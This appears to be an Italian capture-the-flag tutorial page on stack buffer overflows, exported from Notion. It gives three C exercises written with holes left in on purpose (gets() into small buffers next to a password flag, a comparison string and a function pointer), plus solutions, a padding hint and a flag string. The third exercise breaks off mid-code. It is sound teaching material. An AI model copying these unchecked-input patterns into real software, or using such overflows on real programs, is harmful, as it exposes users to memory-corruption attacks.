@@ -1,0 +1,853 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Pwn</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="16145ec3-0d37-81f3-bdc8-c3f56e726f69" class="page sans"><header><img class="page-cover-image" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/buffer-overflow-attacks-min-2487134161.png" style="object-position:center 36.050000000000004%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">👾</span></div><h1 class="page-title">Pwn</h1><p class="page-description"></p></header><div class="page-body"><h1 id="16145ec3-0d37-81cd-aa32-d67c5b0fba4a" class="">Stack:</h1><div id="16145ec3-0d37-8183-9f04-d9b9a5a36c3d" class="column-list"><div id="16145ec3-0d37-8183-a07f-e5ef73fd37cc" style="width:31.25%" class="column"><p id="16145ec3-0d37-819f-9b22-e96b1b880abc" class="">
+</p><p id="16145ec3-0d37-81c0-aa30-eb0f5369a819" class="">Lo stack è uno spazio di memoria nel quale vengono memorizzate le variabili e le informazioni di controllo del programma (come i puntatori di ritorno delle funzioni).</p><p id="16145ec3-0d37-8128-b761-e055c5d7dd6d" class=""><br/>Quando viene allocata una nuova variabile, lo spazio per questa viene riservato &quot;in cima&quot; allo stack.<br/>Si può quindi dire che lo stack cresce dal basso verso l&#x27;alto.<br/><br/></p></div><div id="16145ec3-0d37-8165-9f88-dbabe594362c" style="width:68.75%" class="column"><figure id="16145ec3-0d37-81a5-ad00-d5b89adc620c" class="image" style="text-align:left"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Immaginessss.png"><img style="width:1056px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Immaginessss.png"/></a></figure><p id="16145ec3-0d37-811e-9ca2-e99eb780d4c2" class="">
+</p></div></div><div id="16145ec3-0d37-8183-893f-f510c47c1e37" class="column-list"><div id="16145ec3-0d37-8160-822b-fd874803c8c4" style="width:31.25%" class="column"><p id="16145ec3-0d37-813d-ab56-dfa1dadabcf7" class=""><br/>Il contenuto della variabile viene scritto nel “blocco” ad essa assegnato un po’ come quando si scrive su un foglio: dall’alto verso il basso e da sinistra verso destra.<br/></p></div><div id="16145ec3-0d37-812f-9e2b-ff00da42c79f" style="width:68.75%" class="column"><figure id="16145ec3-0d37-81b5-b364-c25ca83e712d" class="image"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled.png"><img style="width:192px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled.png"/></a></figure></div></div><h1 id="16145ec3-0d37-81d3-bb0e-dd9a85ee0493" class="">Buffer overflow</h1><p id="16145ec3-0d37-814d-8024-de2177349b8d" class="">Un buffer overflow sfrutta il fatto che certi linguaggi di programmazione non controllino automaticamente la dimensione dei dati in input.<br/>Se il programmatore non include controlli aggiuntivi è quindi possibile fornire al programma un input più grande del previsto.<br/>L’input viene salvato nell’area di memoria assegnata alla variabile, detta buffer. <br/>Nel caso in cui si riesca a fornire un input più grande del previsto al programma, questo non potrà essere contenuto nella sua interezza all’interno del buffer ed il programma, continuando a scrivere da sinistra verso destra arriverà ad un certo punto a sovrascrivere i contenuti dell’elemento successivo nello stack, qualsiasi cosa esso rappresenti.<br/></p><p id="16145ec3-0d37-812a-97ac-cac118779799" class="">
+</p><h2 id="16145ec3-0d37-81bb-8bed-d14767100c04" class="">Esercizio 1 Pwn</h2><div id="16145ec3-0d37-81bf-b95a-f811229bf5ab" class="column-list"><div id="16145ec3-0d37-81c7-a352-ec403419e4c5" style="width:50%" class="column"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8102-8734-e7edaddbd12d" class="code"><code class="language-C">int main(void)
+{
+    int pass = 0;
+    char buff[8];
+    
+
+    printf(&quot;\n Enter the password : \n&quot;);
+    gets(buff);
+
+    if(pass)
+    {
+       /* Now Give root or admin rights to user*/
+        printf (&quot;Correct password! \nFlag={hello_world_pwn}\n&quot;);
+    }
+    else{
+      printf(&quot;Wrong password. Status%d\n&quot;, pass);
+    }
+
+    return 0;
+}</code></pre></div><div id="16145ec3-0d37-81c3-bf82-cbb048337303" style="width:50%" class="column"><p id="16145ec3-0d37-810d-a8f7-ef76502e8495" class="">
+</p><p id="16145ec3-0d37-818f-9afa-ed427e229e51" class="">
+</p><p id="16145ec3-0d37-8189-b3db-ff7217399fae" class="">
+</p><figure id="16145ec3-0d37-818a-b096-ca55df6e5e0f" class="image"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%201.png"><img style="width:240px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%201.png"/></a></figure><p id="16145ec3-0d37-8193-ac83-f14505f4349f" class="">
+</p></div></div><p id="16145ec3-0d37-81e9-a44c-fe24a06620b4" class="">Essendo stata creata dopo <code>pass</code>, la variabile <code>buff</code> finisce “in cima” allo stack.<br/>Per passare la condizione dell’if è sufficiente che <br/><code>pass</code> abbia un valore ≠ 0.<br/>Bisogna quindi inserire un input che riempia <br/><code>buff</code> e faccia overflow in <code>pass</code> con il valore corretto</p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Soluzione</summary><div class="indented"><div id="16145ec3-0d37-8140-9469-c4f5cb661533" class="column-list"><div id="16145ec3-0d37-8190-b253-d723c4cf28b3" style="width:50%" class="column"><figure id="16145ec3-0d37-8157-aae6-c671516a2bf7" class="image"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%202.png"><img style="width:480px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%202.png"/></a></figure></div><div id="16145ec3-0d37-812b-be92-e5d982d679b4" style="width:50%" class="column"><figure id="16145ec3-0d37-81a4-bfb7-fc969628d6ce" class="image"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%203.png"><img style="width:415.984375px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%203.png"/></a></figure></div></div><p id="16145ec3-0d37-815c-862b-ebbb77d8979f" class="">Per qualsiasi lettera inserita, verrà salvato il valore corrispondente alla sua rappresentazione ascii. <br/>È sufficiente quindi scrivere una lettera qualsiasi per 9 volte (o anche un numero ≠ 0).<br/></p><figure id="16145ec3-0d37-81ed-9d60-d91939051f52" class="image"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/bof_stack0_reversed.gif"><img style="width:480px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/bof_stack0_reversed.gif"/></a></figure><p id="16145ec3-0d37-8109-af41-dab30e121be7" class="">
+</p></div></details><p id="16145ec3-0d37-81dc-b0f3-c78ee3a851dd" class="">
+</p><h2 id="16145ec3-0d37-8109-b851-dc143b80f69e" class="">Esercizio 2 Pwn</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8132-9fc4-e2a43cb15b5a" class="code"><code class="language-C">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+void print_flag(){
+        system(&quot;cat flag.txt&quot;);
+}
+
+int main(){
+        char josh[4];
+        char buffer[64];
+        setvbuf(stdout,NULL,_IONBF,0);
+        printf(&quot;How&#x27;s the josh?\n&quot;);
+        gets(buffer);
+        if(memcmp(josh,&quot;H!gh&quot;,4)==0) {
+                printf(&quot;Good! here&#x27;s the flag\n&quot;);
+                print_flag();
+        } else {
+                printf(&quot;Your josh is low!\nBye!\n&quot;);
+        }
+        return 0;
+}</code></pre><p id="16145ec3-0d37-81ce-9397-e67c156a14fe" class="">Qui bisogna sovrascrivere la variabile <code>josh</code> in modo da soddisfare la condizione dell’if.<br/>La soluzione è molto simile a quella dell’esercizio sopra!<br/></p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="16145ec3-0d37-81df-a88d-cd60a62489b5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Si può utilizzare python per ottenere una stringa della lunghezza voluta senza scriverla manualmente.<br/>Ad esempio:<br/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-815f-a327-e200b154de30" class="code"><code class="language-Python">print (&quot;A&quot;*64)</code></pre></div></figure><ul id="16145ec3-0d37-8196-a483-da8725ad2ec6" class="toggle"><li><details open=""><summary>Soluzione</summary><p id="16145ec3-0d37-8152-97dd-dc24d6a58cc8" class="">Try this one on your own 😇😉</p></details></li></ul><h2 id="16145ec3-0d37-8133-8cea-d4c49f9719e7" class="">Esercizio 3 Pwn</h2><p id="16145ec3-0d37-8172-bf31-f0dba6a9caa2" class="">(decisamente più difficile)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-81bf-aea9-cd246870d210" class="code"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+struct programmer_t
+{
+    char favourite_lang[32];
+    void (*call)();
+};
+typedef struct programmer_t programmer_t;
+
+void python()
+{
+    printf(&quot;Maybe you want a python shell...\n&quot;);
+    sleep(3);
+    execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo &#x27;python shell&#x27;&quot;, NULL);
+}
+
+void bash()
+{
+    printf(&quot;Opening bash shell...\n&quot;);
+    sleep(3);
+    printf(&quot;are you sure you don&#x27;t prefer java?\n&quot;);
+    if(rand() != 328347) return; //non sarà mai vero
+    // if only there was a way to jump here...
+    execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, NULL);
+}
+
+void nothing()
+{
+    execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;&quot;, NULL);
+}
+
+
+int main(int argc, char** argv)
+{
+    programmer_t user = {0};
+    
+    printf(&quot;Enter your favourite programming language: &quot;);
+    fflush(stdout);
+    int i = 0;
+    char c;
